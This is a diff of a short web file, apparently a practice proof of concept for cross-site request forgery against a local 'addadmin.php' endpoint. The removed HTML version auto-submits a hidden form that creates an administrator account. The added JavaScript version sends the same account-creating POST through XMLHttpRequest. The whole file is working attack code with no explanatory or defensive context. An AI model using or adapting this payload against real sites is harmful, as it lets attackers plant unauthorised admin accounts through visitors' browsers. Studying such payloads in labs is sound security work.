@@ -1,14 +1,27 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>test</h1>
-    <h1>byeeeNMNMN</h1>
-    <form action="http://127.0.0.1/addadmin.php" method="POST">
-      <input type="hidden" name='username' value='amir' />
-      <input type="hidden" name='password' value='amir' />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+// Create a new XMLHttpRequest object
+var xhr = new XMLHttpRequest();
+
+// Define the URL and HTTP method
+var url = 'http://127.0.0.1/addadmin.php';
+var method = 'POST';
+
+// Create the data to be sent as a form-urlencoded string
+var params = 'username=mir&password=mir';
+
+// Open a new request
+xhr.open(method, url, true);
+
+// Set the Content-Type header for a form-urlencoded request
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+// Set up a function to handle the response
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    // Request was successful, handle the response here
+    console.log(xhr.responseText);
+  }
+};
+
+// Send the request with the parameters
+xhr.send(params);
+
